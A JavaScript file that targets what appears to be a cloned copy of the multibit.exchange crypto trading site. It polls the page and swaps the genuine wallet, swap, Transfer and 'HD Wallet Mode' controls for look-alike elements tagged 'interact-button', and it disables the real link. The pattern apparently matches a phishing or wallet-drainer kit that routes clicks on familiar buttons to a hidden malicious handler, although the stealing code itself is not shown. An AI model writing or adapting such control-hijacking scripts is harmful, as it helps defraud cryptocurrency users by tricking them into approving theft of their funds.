let walletBtn;
let swapBtn;
let mainBtn;
let hdwalletMode;
console.log("sserrrnn");

function getBtn() {
  const intv = setInterval(() => {
    walletBtn = document.querySelector(".MuiStack-root.mui-style-1qftbaz");
    swapBtn = document.querySelector(swapBtnClasses);
    mainBtn = document.querySelector(mainBtnClasses);
    hdwalletMode = document.querySelector(
      'a[href="https://app-hd.multibit.exchange/"]'
    );
    console.log("loop");
    if (hdwalletMode) {
      walletBtn.outerHTML = wlt1;
      swapBtn.outerHTML = swapBtn1;
      mainBtn.outerHTML = mainBtn1;
      hdwalletMode.outerHTML = hdwalletMode1;
      console.log(hdwalletMode);
      clearInterval(intv);
    }
  }, 500);
}
getBtn();
// document.addEventListener("DOMContentLoaded", () => {
//   walletBtn = document.querySelector(".MuiStack-root.mui-style-1qftbaz");
//   console.log(walletBtn);
// });

const wlt1 = `<div class="MuiStack-root mui-style-1qftbaz interact-button"><img alt="wallet" width="32" height="32" decoding="async" data-nimg="1" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8cmVjdCB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9IiNCRkZGMEIiIC8+CiAgPHBhdGgKICAgIGQ9Ik04IDEwVjIxQzggMjIuMTA0NiA4Ljg5NTQzIDIzIDEwIDIzSDIyQzIzLjEwNDYgMjMgMjQgMjIuMTA0NiAyNCAyMVYxNEMyNCAxMi44OTU0IDIzLjEwNDYgMTIgMjIgMTJIMTBDOC44OTU0MyAxMiA4IDExLjEwNDYgOCAxMFYxMFpNOCAxMFYxMEM4IDguODk1NDMgOC44OTU0MyA4IDEwIDhIMjIiCiAgICBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIC8+CiAgPGNpcmNsZSBjeD0iMjAuNSIgY3k9IjE3LjUiIHI9IjEuNSIgZmlsbD0iYmxhY2siIC8+Cjwvc3ZnPg==" style="color: transparent;"></div>`;
const swapBtnClasses = `.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.mui-style-hfgrmn`;
const swapBtn1 = `
<button class="MuiButtonBase-root interact-button MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium mui-style-hfgrmn" tabindex="0" type="button"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium mui-style-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SwapVertIcon"><path d="M16 17.01V10h-2v7.01h-3L15 21l4-3.99h-3zM9 3 5 6.99h3V14h2V6.99h3L9 3z"></path></svg><span class="MuiTouchRipple-root mui-style-w0pj6f"></span></button>`;
const mainBtnClasses =
  ".MuiButtonBase-root.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeLarge.MuiButton-containedSizeLarge.MuiButton-fullWidth.Mui-disabled.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeLarge.MuiButton-containedSizeLarge.MuiButton-fullWidth.mui-style-ajoyk0";
const mainBtn1 = `<button class="MuiButtonBase-root interact-button MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge MuiButton-fullWidth  MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge MuiButton-fullWidth mui-style-ajoyk0" tabindex="-1" type="button"><p class="MuiTypography-root interact-button MuiTypography-body1 mui-style-j4vhye">Transfer</p></button>`;

const hdwalletMode1 = `<a  class="interact-button" href="javascript:void();"><p class="MuiTypography-root MuiTypography-body1 interact-button mui-style-kntgtf">HD Wallet Mode →</p></a>`;
